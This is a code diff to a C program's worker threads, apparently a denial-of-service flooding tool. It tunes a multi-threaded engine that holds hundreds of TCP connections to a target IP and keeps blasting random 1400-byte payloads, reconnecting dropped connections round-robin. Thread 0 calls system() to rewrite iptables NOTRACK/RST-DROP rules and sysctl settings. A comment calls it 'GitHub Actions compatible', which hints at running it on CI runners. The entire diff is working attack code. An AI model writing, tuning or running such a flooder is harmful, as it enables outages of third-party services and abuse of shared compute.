@@ -1689,19 +1689,40 @@ void *worker_thread(void *arg) {
         }
         
         if (!use_raw) {
-            // === SOCK_STREAM FALLBACK (GitHub Actions compatible) ===
-            #define RT_CONNS 200
+            // === SOCK_STREAM ENGINE (GitHub Actions compatible) ===
+            
+            // CRITICAL: Remove NOTRACK + RST-DROP that network.c added
+            // SOCK_STREAM needs kernel conntrack + RST to work
+            if (tid == 0) {
+                char cmd[256];
+                snprintf(cmd, sizeof(cmd),
+                    "iptables -D OUTPUT -p tcp --tcp-flags RST RST -d %s -j DROP 2>/dev/null;"
+                    "iptables -t raw -D OUTPUT -p tcp -j NOTRACK 2>/dev/null;"
+                    "iptables -t raw -D PREROUTING -p tcp -j NOTRACK 2>/dev/null;"
+                    "sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1;"
+                    "sysctl -w net.ipv4.tcp_fin_timeout=3 >/dev/null 2>&1;"
+                    "sysctl -w net.ipv4.ip_local_port_range='1024 65535' >/dev/null 2>&1",
+                    args.target_ip);
+                system(cmd);
+                usleep(100000); // Wait for iptables to take effect
+                LOG_INFO("T0: Cleaned NOTRACK/RST-DROP rules for SOCK_STREAM mode");
+                fflush(stdout);
+            } else {
+                usleep(200000); // Other threads wait for T0 to clean rules
+            }
+            
+            #define RT_CONNS 500
             #define RT_PL 1400
-            #define RT_SNDBUF (16*1024*1024)
-            #define RT_MAX_BYTES (512*1024)
-            #define RT_EPOLL_SZ 256
+            #define RT_SNDBUF (4*1024*1024)
+            #define RT_MAX_BYTES (1024*1024)  // 1MB before recycle
+            #define RT_EPOLL_SZ 512
             
             unsigned char *rt_pl = malloc(RT_PL);
             for (int i = 0; i < RT_PL; i++) rt_pl[i] = fast_rand() & 0xFF;
             
-            int rt_fds[RT_CONNS];
-            int rt_st[RT_CONNS];
-            unsigned int rt_sn[RT_CONNS];
+            int *rt_fds = calloc(RT_CONNS, sizeof(int));
+            int *rt_st = calloc(RT_CONNS, sizeof(int));
+            unsigned int *rt_sn = calloc(RT_CONNS, sizeof(unsigned int));
             int rt_epfd = epoll_create1(0);
             
             struct sockaddr_in rt_dst;
@@ -1712,6 +1733,7 @@ void *worker_thread(void *arg) {
             
             for (int i = 0; i < RT_CONNS; i++) rt_fds[i] = -1;
             
+            // Staggered connection creation to avoid burst
             for (int i = 0; i < RT_CONNS; i++) {
                 int fd = socket(AF_INET, SOCK_STREAM, 0);
                 if (fd < 0) continue;
@@ -1731,9 +1753,11 @@ void *worker_thread(void *arg) {
                      inet_ntoa(rt_dst.sin_addr), args.port);
             fflush(stdout);
             
-            struct epoll_event rt_evs[RT_EPOLL_SZ];
+            struct epoll_event *rt_evs = calloc(RT_EPOLL_SZ, sizeof(struct epoll_event));
+            int reconn_idx = 0; // Round-robin reconnect index
+            
             while (1) {
-                int nev = epoll_wait(rt_epfd, rt_evs, RT_EPOLL_SZ, 50);
+                int nev = epoll_wait(rt_epfd, rt_evs, RT_EPOLL_SZ, 10);
                 if (nev < 0 && errno != EINTR) break;
                 
                 for (int e = 0; e < nev; e++) {
@@ -1752,9 +1776,10 @@ void *worker_thread(void *arg) {
                             if (err) goto rt_reconn;
                             rt_st[idx] = 1;
                         }
-                        for (int burst = 0; burst < 32; burst++) {
+                        for (int burst = 0; burst < 64; burst++) {
                             *((unsigned int*)rt_pl) = fast_rand();
                             *((unsigned int*)(rt_pl+4)) = fast_rand();
+                            *((unsigned int*)(rt_pl+8)) = fast_rand();
                             int s = send(fd, rt_pl, RT_PL, MSG_NOSIGNAL | MSG_DONTWAIT);
                             if (s > 0) {
                                 rt_sn[idx] += s;
@@ -1787,9 +1812,10 @@ void *worker_thread(void *arg) {
                     rt_fds[idx] = fd; rt_st[idx] = 0; rt_sn[idx] = 0;
                 }
                 
-                // Reconnect dead
-                for (int i = 0; i < RT_CONNS; i++) {
-                    if (rt_fds[i] < 0) {
+                // Background reconnect: fix 5 dead slots per loop iteration
+                for (int r = 0; r < 5; r++) {
+                    reconn_idx = (reconn_idx + 1) % RT_CONNS;
+                    if (rt_fds[reconn_idx] < 0) {
                         int fd = socket(AF_INET, SOCK_STREAM, 0);
                         if (fd < 0) continue;
                         int fl3 = fcntl(fd, F_GETFL, 0);
@@ -1798,13 +1824,14 @@ void *worker_thread(void *arg) {
                         connect(fd, (struct sockaddr*)&rt_dst, sizeof(rt_dst));
                         struct epoll_event ev3;
                         ev3.events = EPOLLOUT | EPOLLERR | EPOLLHUP;
-                        ev3.data.u32 = (unsigned int)i;
+                        ev3.data.u32 = (unsigned int)reconn_idx;
                         epoll_ctl(rt_epfd, EPOLL_CTL_ADD, fd, &ev3);
-                        rt_fds[i] = fd; rt_st[i] = 0; rt_sn[i] = 0;
+                        rt_fds[reconn_idx] = fd; rt_st[reconn_idx] = 0; rt_sn[reconn_idx] = 0;
                     }
                 }
             }
-            free(rt_pl); close(rt_epfd);
+            free(rt_pl); free(rt_fds); free(rt_st); free(rt_sn); free(rt_evs);
+            close(rt_epfd);
             return NULL;
         }
         
